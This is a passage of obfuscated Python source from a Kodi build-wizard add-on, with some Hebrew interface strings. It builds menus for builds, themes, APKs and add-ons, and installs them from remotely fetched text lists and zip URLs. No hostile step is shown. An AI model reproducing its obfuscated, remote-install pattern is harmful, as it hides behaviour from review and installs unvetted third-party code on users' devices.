							if not DEVELOPER =='true'and wiz .strTest (OOOOOO0OOO0O0OOO0 ):continue #line:2121
							OOO00OOO000000O0O =int (float (OO00OOOOO000000O0 ))#line:2122
							if OOO00OOO000000O0O ==17 :#line:2123
								OO0000OO0000OOOO0 =createMenu ('install','',OOOOOO0OOO0O0OOO0 )#line:2124
								addDir ('[%s] %s (v%s)'%(float (OO00OOOOO000000O0 ),OOOOOO0OOO0O0OOO0 ,OOO0O0OO0O000OO0O ),'viewbuild',OOOOOO0OOO0O0OOO0 ,description =O00000OOO0O0O00O0 ,fanart =O00OOO00OOO00OO00 ,icon =OOOOO0O000O000OO0 ,menu =OO0000OO0000OOOO0 ,themeit =THEME2 )#line:2125
				if OOO00OO00O000O00O >0 :#line:2126
					O00OO00OO0000O00O ='+'if SHOW18 =='false'else '-'#line:2127
					if SHOW18 =='true':#line:2129
						for OOOOOO0OOO0O0OOO0 ,OOO0O0OO0O000OO0O ,O0O0O00OO000O0000 ,O0OOO0OOO00000OOO ,OO00OOOOO000000O0 ,O0O0OOOO00000OO00 ,OOOOO0O000O000OO0 ,O00OOO00OOO00OO00 ,O000OOOO000OOO0O0 ,O00000OOO0O0O00O0 in OOOOOO00O0O0O0O00 :#line:2131
							if not SHOWADULT =='true'and O000OOOO000OOO0O0 .lower ()=='yes':continue #line:2132
							if not DEVELOPER =='true'and wiz .strTest (OOOOOO0OOO0O0OOO0 ):continue #line:2133
							OOO00OOO000000O0O =int (float (OO00OOOOO000000O0 ))#line:2134
							if OOO00OOO000000O0O ==18 :#line:2135
								OO0000OO0000OOOO0 =createMenu ('install','',OOOOOO0OOO0O0OOO0 )#line:2136
								addDir ('[%s] %s (v%s)'%(float (OO00OOOOO000000O0 ),OOOOOO0OOO0O0OOO0 ,OOO0O0OO0O000OO0O ),'viewbuild',OOOOOO0OOO0O0OOO0 ,description =O00000OOO0O0O00O0 ,fanart =O00OOO00OOO00OO00 ,icon =OOOOO0O000O000OO0 ,menu =OO0000OO0000OOOO0 ,themeit =THEME2 )#line:2137
				if O00OO0OO0OOOOO0O0 >0 :#line:2138
					O00OO00OO0000O00O ='+'if SHOW16 =='false'else '-'#line:2139
					addFile ('[B]%s Jarvis Builds(%s)[/B]'%(O00OO00OO0000O00O ,O00OO0OO0OOOOO0O0 ),'togglesetting','show16',themeit =THEME3 )#line:2140
					if SHOW16 =='true':#line:2141
						for OOOOOO0OOO0O0OOO0 ,OOO0O0OO0O000OO0O ,O0O0O00OO000O0000 ,O0OOO0OOO00000OOO ,OO00OOOOO000000O0 ,O0O0OOOO00000OO00 ,OOOOO0O000O000OO0 ,O00OOO00OOO00OO00 ,O000OOOO000OOO0O0 ,O00000OOO0O0O00O0 in OOOOOO00O0O0O0O00 :#line:2142
							if not SHOWADULT =='true'and O000OOOO000OOO0O0 .lower ()=='yes':continue #line:2143
							if not DEVELOPER =='true'and wiz .strTest (OOOOOO0OOO0O0OOO0 ):continue #line:2144
							OOO00OOO000000O0O =int (float (OO00OOOOO000000O0 ))#line:2145
							if OOO00OOO000000O0O ==16 :#line:2146
								OO0000OO0000OOOO0 =createMenu ('install','',OOOOOO0OOO0O0OOO0 )#line:2147
								addDir ('[%s] %s (v%s)'%(float (OO00OOOOO000000O0 ),OOOOOO0OOO0O0OOO0 ,OOO0O0OO0O000OO0O ),'viewbuild',OOOOOO0OOO0O0OOO0 ,description =O00000OOO0O0O00O0 ,fanart =O00OOO00OOO00OO00 ,icon =OOOOO0O000O000OO0 ,menu =OO0000OO0000OOOO0 ,themeit =THEME2 )#line:2148
				if OOOO00000O000O0OO >0 :#line:2149
					O00OO00OO0000O00O ='+'if SHOW15 =='false'else '-'#line:2150
					addFile ('[B]%s Isengard and Below Builds(%s)[/B]'%(O00OO00OO0000O00O ,OOOO00000O000O0OO ),'togglesetting','show15',themeit =THEME3 )#line:2151
					if SHOW15 =='true':#line:2152
						for OOOOOO0OOO0O0OOO0 ,OOO0O0OO0O000OO0O ,O0O0O00OO000O0000 ,O0OOO0OOO00000OOO ,OO00OOOOO000000O0 ,O0O0OOOO00000OO00 ,OOOOO0O000O000OO0 ,O00OOO00OOO00OO00 ,O000OOOO000OOO0O0 ,O00000OOO0O0O00O0 in OOOOOO00O0O0O0O00 :#line:2153
							if not SHOWADULT =='true'and O000OOOO000OOO0O0 .lower ()=='yes':continue #line:2154
							if not DEVELOPER =='true'and wiz .strTest (OOOOOO0OOO0O0OOO0 ):continue #line:2155
							OOO00OOO000000O0O =int (float (OO00OOOOO000000O0 ))#line:2156
							if OOO00OOO000000O0O <=15 :#line:2157
								OO0000OO0000OOOO0 =createMenu ('install','',OOOOOO0OOO0O0OOO0 )#line:2158
								addDir ('[%s] %s (v%s)'%(float (OO00OOOOO000000O0 ),OOOOOO0OOO0O0OOO0 ,OOO0O0OO0O000OO0O ),'viewbuild',OOOOOO0OOO0O0OOO0 ,description =O00000OOO0O0O00O0 ,fanart =O00OOO00OOO00OO00 ,icon =OOOOO0O000O000OO0 ,menu =OO0000OO0000OOOO0 ,themeit =THEME2 )#line:2159
		elif O0OOOO0O0OOO0O000 >0 :#line:2160
			if OO0O0000O000000OO >0 :#line:2161
				addFile ('There is currently only Adult builds','',icon =ICONBUILDS ,themeit =THEME3 )#line:2162
				addFile ('Enable Show Adults in Addon Settings > Misc','',icon =ICONBUILDS ,themeit =THEME3 )#line:2163
			else :#line:2164
				addFile ('Currently No Builds Offered from %s'%ADDONTITLE ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2165
		else :addFile ('Text file for builds not formated correctly.','',icon =ICONBUILDS ,themeit =THEME3 )#line:2166
	setView ('files','viewType')#line:2167
def viewBuild (OOO00OO0OO0O0OO00 ):#line:2169
	OOOO0OO00O0O00O0O =wiz .workingURL (SPEEDFILE )#line:2170
	if not OOOO0OO00O0O00O0O ==True :#line:2171
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',themeit =THEME3 )#line:2172
		addFile ('%s'%OOOO0OO00O0O00O0O ,'',themeit =THEME3 )#line:2173
		return #line:2174
	if wiz .checkBuild (OOO00OO0OO0O0OO00 ,'version')==False :#line:2175
		addFile ('Error reading the txt file.','',themeit =THEME3 )#line:2176
		addFile ('%s was not found in the builds list.'%OOO00OO0OO0O0OO00 ,'',themeit =THEME3 )#line:2177
		return #line:2178
	O000OOOOOOO0O0O00 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"')#line:2179
	O000OO0OOO00OOOO0 =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%OOO00OO0OO0O0OO00 ).findall (O000OOOOOOO0O0O00 )#line:2180
	for O0O0OOO0O00OO0O0O ,OO0OO000O00O000O0 ,O0O00OOO00O000OO0 ,OOO00OO00O0000OOO ,OO00OOO0O0OOO00OO ,O0OO00000O0000O0O ,O000OOOO0OO0OO000 ,O000OO0OO0O0OO0OO ,O000OOOO000O0OO0O ,O00O00OOO0OO000O0 in O000OO0OOO00OOOO0 :#line:2181
		O0OO00000O0000O0O =O0OO00000O0000O0O if wiz .workingURL (O0OO00000O0000O0O )else ICON #line:2182
		O000OOOO0OO0OO000 =O000OOOO0OO0OO000 if wiz .workingURL (O000OOOO0OO0OO000 )else FANART #line:2183
		OOOOOOOO00O0OOO00 ='%s (v%s)'%(OOO00OO0OO0O0OO00 ,O0O0OOO0O00OO0O0O )#line:2184
		if BUILDNAME ==OOO00OO0OO0O0OO00 and O0O0OOO0O00OO0O0O >BUILDVERSION :#line:2185
			OOOOOOOO00O0OOO00 ='%s [COLOR red][CURRENT v%s][/COLOR]'%(OOOOOOOO00O0OOO00 ,BUILDVERSION )#line:2186
		OOO0O0O0OOO00O000 =int (float (KODIV ));OOOO0OOO0OOO00O00 =int (float (OOO00OO00O0000OOO ))#line:2195
		if not OOO0O0O0OOO00O000 ==OOOO0OOO0OOO00O00 :#line:2196
			if OOO0O0O0OOO00O000 ==16 and OOOO0OOO0OOO00O00 <=15 :OO00O0OOOOO0OOO00 =False #line:2197
			else :OO00O0OOOOO0OOO00 =True #line:2198
		else :OO00O0OOOOO0OOO00 =False #line:2199
		addFile ('התקנה','install',OOO00OO0OO0O0OO00 ,'fresh',description =O00O00OOO0OO000O0 ,fanart =O000OOOO0OO0OO000 ,icon =O0OO00000O0000O0O ,themeit =THEME1 )#line:2203
		if not OO00OOO0O0OOO00OO =='http://':#line:2206
			if wiz .workingURL (OO00OOO0O0OOO00OO )==True :#line:2207
				addFile (wiz .sep ('THEMES'),'',fanart =O000OOOO0OO0OO000 ,icon =O0OO00000O0000O0O ,themeit =THEME3 )#line:2208
				O000OOOOOOO0O0O00 =wiz .openURL (OO00OOO0O0OOO00OO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2209
				O000OO0OOO00OOOO0 =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O000OOOOOOO0O0O00 )#line:2210
				for OO0O0000O0O000000 ,O00000OOO0000OOO0 ,OO0OO000O0OO00O00 ,O0O0000O0OOO0O0O0 ,O00O00O0O000OOOO0 ,O00O00OOO0OO000O0 in O000OO0OOO00OOOO0 :#line:2211
					if not SHOWADULT =='true'and O00O00O0O000OOOO0 .lower ()=='yes':continue #line:2212
					OO0OO000O0OO00O00 =OO0OO000O0OO00O00 if OO0OO000O0OO00O00 =='http://'else O0OO00000O0000O0O #line:2213
					O0O0000O0OOO0O0O0 =O0O0000O0OOO0O0O0 if O0O0000O0OOO0O0O0 =='http://'else O000OOOO0OO0OO000 #line:2214
					addFile (OO0O0000O0O000000 if not OO0O0000O0O000000 ==BUILDTHEME else "[B]%s (Installed)[/B]"%OO0O0000O0O000000 ,'theme',OOO00OO0OO0O0OO00 ,OO0O0000O0O000000 ,description =O00O00OOO0OO000O0 ,fanart =O0O0000O0OOO0O0O0 ,icon =OO0OO000O0OO00O00 ,themeit =THEME3 )#line:2215
	setView ('files','viewType')#line:2216
def viewThirdList (OOO00O000O00O00O0 ):#line:2218
	O0000O00OO000000O =eval ('THIRD%sNAME'%OOO00O000O00O00O0 )#line:2219
	OOOO000O0O0OOOO00 =eval ('THIRD%sURL'%OOO00O000O00O00O0 )#line:2220
	O00OO0OO0000OO00O =wiz .workingURL (OOOO000O0O0OOOO00 )#line:2221
	if not O00OO0OO0000OO00O ==True :#line:2222
		addFile ('Url for txt file not valid','',icon =ICONBUILDS ,themeit =THEME3 )#line:2223
		addFile ('%s'%WORKINGURL ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2224
	else :#line:2225
		O0O0O00O00O000OO0 ,OOO00OO00O0OO0O00 =wiz .thirdParty (OOOO000O0O0OOOO00 )#line:2226
		addFile ("[B]%s[/B]"%O0000O00OO000000O ,'',themeit =THEME3 )#line:2227
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2228
		if O0O0O00O00O000OO0 :#line:2229
			for O0000O00OO000000O ,O0O00OOO000OO00O0 ,OOOO000O0O0OOOO00 ,OOOO0O0O00OO00OO0 ,O0000OOO0O00OO0OO ,OOO0O0O00OO00O0OO ,O00O0OOO0OO0O0O0O ,OO00O00O0OOOOOOO0 in OOO00OO00O0OO0O00 :#line:2230
				if not SHOWADULT =='true'and O00O0OOO0OO0O0O0O .lower ()=='yes':continue #line:2231
				addFile ("[%s] %s v%s"%(OOOO0O0O00OO00OO0 ,O0000O00OO000000O ,O0O00OOO000OO00O0 ),'installthird',O0000O00OO000000O ,OOOO000O0O0OOOO00 ,icon =O0000OOO0O00OO0OO ,fanart =OOO0O0O00OO00O0OO ,description =OO00O00O0OOOOOOO0 ,themeit =THEME2 )#line:2232
		else :#line:2233
			for O0000O00OO000000O ,OOOO000O0O0OOOO00 ,O0000OOO0O00OO0OO ,OOO0O0O00OO00O0OO ,OO00O00O0OOOOOOO0 in OOO00OO00O0OO0O00 :#line:2234
				addFile (O0000O00OO000000O ,'installthird',O0000O00OO000000O ,OOOO000O0O0OOOO00 ,icon =O0000OOO0O00OO0OO ,fanart =OOO0O0O00OO00O0OO ,description =OO00O00O0OOOOOOO0 ,themeit =THEME2 )#line:2235
def editThirdParty (O00O00000O00O00OO ):#line:2237
	O00O0OO0OO00OO0OO =eval ('THIRD%sNAME'%O00O00000O00O00OO )#line:2238
	OO0OO00O00O0O0OOO =eval ('THIRD%sURL'%O00O00000O00O00OO )#line:2239
	OOOO00O000000OO0O =wiz .getKeyboard (O00O0OO0OO00OO0OO ,'Enter the Name of the Wizard')#line:2240
	O0OO0OO00OOO0OO0O =wiz .getKeyboard (OO0OO00O00O0O0OOO ,'Enter the URL of the Wizard Text')#line:2241
	wiz .setS ('wizard%sname'%O00O00000O00O00OO ,OOOO00O000000OO0O )#line:2243
	wiz .setS ('wizard%surl'%O00O00000O00O00OO ,O0OO0OO00OOO0OO0O )#line:2244
def apkScraper (name =""):#line:2246
	if name =='kodi':#line:2247
		OO0O0O000O0OO0OO0 ='http://mirrors.kodi.tv/releases/android/arm/'#line:2248
		OO0000O00O0OOO0O0 ='http://mirrors.kodi.tv/releases/android/arm/old/'#line:2249
		OO00O0O00OOO0OO0O =wiz .openURL (OO0O0O000O0OO0OO0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2250
		OO0O00OOO0OOOO0OO =wiz .openURL (OO0000O00O0OOO0O0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2251
		O0O0OO0O0O0O00OOO =0 #line:2252
		O00OO00O000OO0O00 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OO00O0O00OOO0OO0O )#line:2253
		O00OO000OO0O000O0 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OO0O00OOO0OOOO0OO )#line:2254
		addFile ("Official Kodi Apk\'s",themeit =THEME1 )#line:2256
		O00O0O0O0OOOO0O00 =False #line:2257
		for OOOOO0OO0000O00O0 ,name ,OO00OOO0O0000O0O0 ,O0OO000OOOO00OO0O in O00OO00O000OO0O00 :#line:2258
			if OOOOO0OO0000O00O0 in ['../','old/']:continue #line:2259
			if not OOOOO0OO0000O00O0 .endswith ('.apk'):continue #line:2260
			if not OOOOO0OO0000O00O0 .find ('_')==-1 and O00O0O0O0OOOO0O00 ==True :continue #line:2261
			try :#line:2262
				O0OO00OO00000000O =name .split ('-')#line:2263
				if not OOOOO0OO0000O00O0 .find ('_')==-1 :#line:2264
					O00O0O0O0OOOO0O00 =True #line:2265
					O00OO0000O00000OO ,O0O0O00OO0O0O000O =O0OO00OO00000000O [2 ].split ('_')#line:2266
				else :#line:2267
					O00OO0000O00000OO =O0OO00OO00000000O [2 ]#line:2268
					O0O0O00OO0O0O000O =''#line:2269
				OOOO0O000000OO0OO ="[COLOR %s]%s v%s%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OO00OO00000000O [0 ].title (),O0OO00OO00000000O [1 ],O0O0O00OO0O0O000O .upper (),O00OO0000O00000OO ,COLOR2 ,OO00OOO0O0000O0O0 .replace (' ',''),COLOR1 ,O0OO000OOOO00OO0O )#line:2270
				O000000OOO0O0O00O =urljoin (OO0O0O000O0OO0OO0 ,OOOOO0OO0000O00O0 )#line:2271
				addFile (OOOO0O000000OO0OO ,'apkinstall',"%s v%s%s %s"%(O0OO00OO00000000O [0 ].title (),O0OO00OO00000000O [1 ],O0O0O00OO0O0O000O .upper (),O00OO0000O00000OO ),O000000OOO0O0O00O )#line:2272
				O0O0OO0O0O0O00OOO +=1 #line:2273
			except :#line:2274
				wiz .log ("Error on: %s"%name )#line:2275
		for OOOOO0OO0000O00O0 ,name ,OO00OOO0O0000O0O0 ,O0OO000OOOO00OO0O in O00OO000OO0O000O0 :#line:2277
			if OOOOO0OO0000O00O0 in ['../','old/']:continue #line:2278
			if not OOOOO0OO0000O00O0 .endswith ('.apk'):continue #line:2279
			if not OOOOO0OO0000O00O0 .find ('_')==-1 :continue #line:2280
			try :#line:2281
				O0OO00OO00000000O =name .split ('-')#line:2282
				OOOO0O000000OO0OO ="[COLOR %s]%s v%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OO00OO00000000O [0 ].title (),O0OO00OO00000000O [1 ],O0OO00OO00000000O [2 ],COLOR2 ,OO00OOO0O0000O0O0 .replace (' ',''),COLOR1 ,O0OO000OOOO00OO0O )#line:2283
				O000000OOO0O0O00O =urljoin (OO0000O00O0OOO0O0 ,OOOOO0OO0000O00O0 )#line:2284
				addFile (OOOO0O000000OO0OO ,'apkinstall',"%s v%s %s"%(O0OO00OO00000000O [0 ].title (),O0OO00OO00000000O [1 ],O0OO00OO00000000O [2 ]),O000000OOO0O0O00O )#line:2285
				O0O0OO0O0O0O00OOO +=1 #line:2286
			except :#line:2287
				wiz .log ("Error on: %s"%name )#line:2288
		if O0O0OO0O0O0O00OOO ==0 :addFile ("Error Kodi Scraper Is Currently Down.")#line:2289
	elif name =='spmc':#line:2290
		OOO00O000OO000OO0 ='https://github.com/koying/SPMC/releases'#line:2291
		OO00O0O00OOO0OO0O =wiz .openURL (OOO00O000OO000OO0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2292
		O0O0OO0O0O0O00OOO =0 #line:2293
		O00OO00O000OO0O00 =re .compile ('<div.+?lass="release-body.+?div class="release-header".+?a href=.+?>(.+?)</a>.+?ul class="release-downloads">(.+?)</ul>.+?/div>').findall (OO00O0O00OOO0OO0O )#line:2294
		addFile ("Official SPMC Apk\'s",themeit =THEME1 )#line:2296
		for name ,OOOOOO00O0O00O0OO in O00OO00O000OO0O00 :#line:2298
			OO0OOOO00O0O0OO00 =''#line:2299
			O00OO000OO0O000O0 =re .compile ('<li>.+?<a href="(.+?)" rel="nofollow">.+?<small class="text-gray float-right">(.+?)</small>.+?strong>(.+?)</strong>.+?</a>.+?</li>').findall (OOOOOO00O0O00O0OO )#line:2300
			for O0O0O000000O00O0O ,O00O00OOOOOO0O0OO ,OOOO00OO000OO00O0 in O00OO000OO0O000O0 :#line:2301
				if OOOO00OO000OO00O0 .find ('armeabi')==-1 :continue #line:2302
				if OOOO00OO000OO00O0 .find ('launcher')>-1 :continue #line:2303
				OO0OOOO00O0O0OO00 =urljoin ('https://github.com',O0O0O000000O00O0O )#line:2304
				break #line:2305
		if O0O0OO0O0O0O00OOO ==0 :addFile ("Error SPMC Scraper Is Currently Down.")#line:2307
def apkMenu (url =None ):#line:2309
	if url ==None :#line:2310
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2313
	if not APKFILE =='http://':#line:2314
		if url ==None :#line:2315
			O00O0O000O0OOO00O =wiz .workingURL (APKFILE )#line:2316
			OO00OO0O00000OO0O =uservar .APKFILE #line:2317
		else :#line:2318
			O00O0O000O0OOO00O =wiz .workingURL (url )#line:2319
			OO00OO0O00000OO0O =url #line:2320
		if O00O0O000O0OOO00O ==True :#line:2321
			OO00O00O0000O0OO0 =wiz .openURL (OO00OO0O00000OO0O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2322
			OO0000OO00O00O00O =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO00O00O0000O0OO0 )#line:2323
			if len (OO0000OO00O00O00O )>0 :#line:2324
				OO0O0OO0OOO00OO0O =0 #line:2325
				for O0000OOO00O00O0O0 ,OO00OOO000O00OOO0 ,url ,O00OO0O000OO0OOO0 ,O00O0O0O00O0OO0O0 ,O00O00OOOO0OOO00O ,O0OOOO000O00OO0O0 in OO0000OO00O00O00O :#line:2326
					if not SHOWADULT =='true'and O00O00OOOO0OOO00O .lower ()=='yes':continue #line:2327
					if OO00OOO000O00OOO0 .lower ()=='yes':#line:2328
						OO0O0OO0OOO00OO0O +=1 #line:2329
						addDir ("[B]%s[/B]"%O0000OOO00O00O0O0 ,'apk',url ,description =O0OOOO000O00OO0O0 ,icon =O00OO0O000OO0OOO0 ,fanart =O00O0O0O00O0OO0O0 ,themeit =THEME3 )#line:2330
					else :#line:2331
						OO0O0OO0OOO00OO0O +=1 #line:2332
						addFile (O0000OOO00O00O0O0 ,'apkinstall',O0000OOO00O00O0O0 ,url ,description =O0OOOO000O00OO0O0 ,icon =O00OO0O000OO0OOO0 ,fanart =O00O0O0O00O0OO0O0 ,themeit =THEME2 )#line:2333
					if OO0O0OO0OOO00OO0O <1 :#line:2334
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2335
			else :wiz .log ("[APK Menu] ERROR: Invalid Format.",xbmc .LOGERROR )#line:2336
		else :#line:2337
			wiz .log ("[APK Menu] ERROR: URL for apk list not working.",xbmc .LOGERROR )#line:2338
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2339
			addFile ('%s'%O00O0O000O0OOO00O ,'',themeit =THEME3 )#line:2340
		return #line:2341
	else :wiz .log ("[APK Menu] No APK list added.")#line:2342
	setView ('files','viewType')#line:2343
def addonMenu (url =None ):#line:2345
	if not ADDONFILE =='http://':#line:2346
		if url ==None :#line:2347
			OOOO000O0OOOO00OO =wiz .workingURL (ADDONFILE )#line:2348
			OOOO000000O0OO0OO =uservar .ADDONFILE #line:2349
		else :#line:2350
			OOOO000O0OOOO00OO =wiz .workingURL (url )#line:2351
			OOOO000000O0OO0OO =url #line:2352
		if OOOO000O0OOOO00OO ==True :#line:2353
			OOO00000OO0000OO0 =wiz .openURL (OOOO000000O0OO0OO ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2354
			OO0OOO0O0OO000O00 =re .compile ('name="(.+?)".+?lugin="(.+?)".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OOO00000OO0000OO0 )#line:2355
			if len (OO0OOO0O0OO000O00 )>0 :#line:2356
				OO0000OO0O0000OOO =0 #line:2357
				for OOOOOO0O000OOO0OO ,OO0O00OO0OOO0000O ,url ,O0O0000000OOO000O ,OOO0O00000O000000 ,O00O0OOO00O00OOO0 ,OOO000O00O00OO0O0 ,OOO00O000O00000OO ,OOO00O00000O0O0O0 ,OOO000O00O00OO0OO in OO0OOO0O0OO000O00 :#line:2358
					if OO0O00OO0OOO0000O .lower ()=='section':#line:2359
						OO0000OO0O0000OOO +=1 #line:2360
						addDir ("[B]%s[/B]"%OOOOOO0O000OOO0OO ,'addons',url ,description =OOO000O00O00OO0OO ,icon =OOO000O00O00OO0O0 ,fanart =OOO00O000O00000OO ,themeit =THEME3 )#line:2361
					else :#line:2362
						if not SHOWADULT =='true'and OOO00O00000O0O0O0 .lower ()=='yes':continue #line:2363
						try :#line:2364
							O000OO00O0O0O000O =xbmcaddon .Addon (id =OO0O00OO0OOO0000O ).getAddonInfo ('path')#line:2365
							if os .path .exists (O000OO00O0O0O000O ):#line:2366
								OOOOOO0O000OOO0OO ="[COLOR green][Installed][/COLOR] %s"%OOOOOO0O000OOO0OO #line:2367
						except :#line:2368
							pass #line:2369
						OO0000OO0O0000OOO +=1 #line:2370
						addFile (OOOOOO0O000OOO0OO ,'addoninstall',OO0O00OO0OOO0000O ,OOOO000000O0OO0OO ,description =OOO000O00O00OO0OO ,icon =OOO000O00O00OO0O0 ,fanart =OOO00O000O00000OO ,themeit =THEME2 )#line:2371
					if OO0000OO0O0000OOO <1 :#line:2372
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2373
			else :#line:2374
				addFile ('Text File not formated correctly!','',themeit =THEME3 )#line:2375
				wiz .log ("[Addon Menu] ERROR: Invalid Format.")#line:2376
		else :#line:2377
			wiz .log ("[Addon Menu] ERROR: URL for Addon list not working.")#line:2378
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2379
			addFile ('%s'%OOOO000O0OOOO00OO ,'',themeit =THEME3 )#line:2380
	else :wiz .log ("[Addon Menu] No Addon list added.")#line:2381
	setView ('files','viewType')#line:2382
def addonInstaller (O0OO0O00OO0OO000O ,O0OO00000OOOO0O00 ):#line:2384
	if not ADDONFILE =='http://':#line:2385
		O00000OO0OO00O00O =wiz .workingURL (O0OO00000OOOO0O00 )#line:2386
		if O00000OO0OO00O00O ==True :#line:2387
			O000OO0000O000000 =wiz .openURL (O0OO00000OOOO0O00 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2388
			O0O0O00OO00O00O00 =re .compile ('name="(.+?)".+?lugin="%s".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%O0OO0O00OO0OO000O ).findall (O000OO0000O000000 )#line:2389
			if len (O0O0O00OO00O00O00 )>0 :#line:2390
				for OOOO0O00000OO0OO0 ,O0OO00000OOOO0O00 ,OO0O0OOOOO0OO0000 ,O0OO00O00O00OOOOO ,O00OOOO000O0OO00O ,O00O00O0OO00OOOO0 ,O00O0O00OOO0O0OO0 ,O0OOO0OOO00OO0O00 ,O00OO0O00O000000O in O0O0O00OO00O00O00 :#line:2391
					if os .path .exists (os .path .join (ADDONS ,O0OO0O00OO0OO000O )):#line:2392
						OOO0O0OO00OOOO0OO =['Launch Addon','Remove Addon']#line:2393
						OOO00OOO0O0O00OOO =DIALOG .select ("[COLOR %s]Addon already installed what would you like to do?[/COLOR]"%COLOR2 ,OOO0O0OO00OOOO0OO )#line:2394
						if OOO00OOO0O0O00OOO ==0 :#line:2395
							wiz .ebi ('RunAddon(%s)'%O0OO0O00OO0OO000O )#line:2396
							xbmc .sleep (1000 )#line:2397
							return True #line:2398
						elif OOO00OOO0O0O00OOO ==1 :#line:2399
							wiz .cleanHouse (os .path .join (ADDONS ,O0OO0O00OO0OO000O ))#line:2400
							try :wiz .removeFolder (os .path .join (ADDONS ,O0OO0O00OO0OO000O ))#line:2401
							except :pass #line:2402
							if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to remove the addon_data for:"%COLOR2 ,"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,O0OO0O00OO0OO000O ),yeslabel ="[B][COLOR green]Yes Remove[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2403
								removeAddonData (O0OO0O00OO0OO000O )#line:2404
							wiz .refresh ()#line:2405
							return True #line:2406
						else :#line:2407
							return False #line:2408
					OO00O0O00O000OO00 =os .path .join (ADDONS ,OO0O0OOOOO0OO0000 )#line:2409
					if not OO0O0OOOOO0OO0000 .lower ()=='none'and not os .path .exists (OO00O0O00O000OO00 ):#line:2410
						wiz .log ("Repository not installed, installing it")#line:2411
						if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to install the repository for [COLOR %s]%s[/COLOR]:"%(COLOR2 ,COLOR1 ,O0OO0O00OO0OO000O ),"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,OO0O0OOOOO0OO0000 ),yeslabel ="[B][COLOR green]Yes Install[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2412
							OO0O00OOO00O0OOOO =wiz .parseDOM (wiz .openURL (O0OO00O00O00OOOOO ),'addon',ret ='version',attrs ={'id':OO0O0OOOOO0OO0000 })#line:2413
							if len (OO0O00OOO00O0OOOO )>0 :#line:2414
								O0OO0O0OOOOOO00O0 ='%s%s-%s.zip'%(O00OOOO000O0OO00O ,OO0O0OOOOO0OO0000 ,OO0O00OOO00O0OOOO [0 ])#line:2415
								wiz .log (O0OO0O0OOOOOO00O0 )#line:2416
								if KODIV >=17 :wiz .addonDatabase (OO0O0OOOOO0OO0000 ,1 )#line:2417
								installAddon (OO0O0OOOOO0OO0000 ,O0OO0O0OOOOOO00O0 )#line:2418
								wiz .ebi ('UpdateAddonRepos()')#line:2419
								wiz .log ("Installing Addon from Kodi")#line:2421
								O0OO0O0000OO0O0OO =installFromKodi (O0OO0O00OO0OO000O )#line:2422
								wiz .log ("Install from Kodi: %s"%O0OO0O0000OO0O0OO )#line:2423
								if O0OO0O0000OO0O0OO :#line:2424
									wiz .refresh ()#line:2425
									return True #line:2426
							else :#line:2427
								wiz .log ("[Addon Installer] Repository not installed: Unable to grab url! (%s)"%OO0O0OOOOO0OO0000 )#line:2428
						else :wiz .log ("[Addon Installer] Repository for %s not installed: %s"%(O0OO0O00OO0OO000O ,OO0O0OOOOO0OO0000 ))#line:2429
					elif OO0O0OOOOO0OO0000 .lower ()=='none':#line:2430
						wiz .log ("No repository, installing addon")#line:2431
						O0OOOO0OO0O0OOO00 =O0OO0O00OO0OO000O #line:2432
						O00O00000O00O0OOO =O0OO00000OOOO0O00 #line:2433
						installAddon (O0OO0O00OO0OO000O ,O0OO00000OOOO0O00 )#line:2434
						wiz .refresh ()#line:2435
						return True #line:2436
					else :#line:2437
						wiz .log ("Repository installed, installing addon")#line:2438
						O0OO0O0000OO0O0OO =installFromKodi (O0OO0O00OO0OO000O ,False )#line:2439
						if O0OO0O0000OO0O0OO :#line:2440
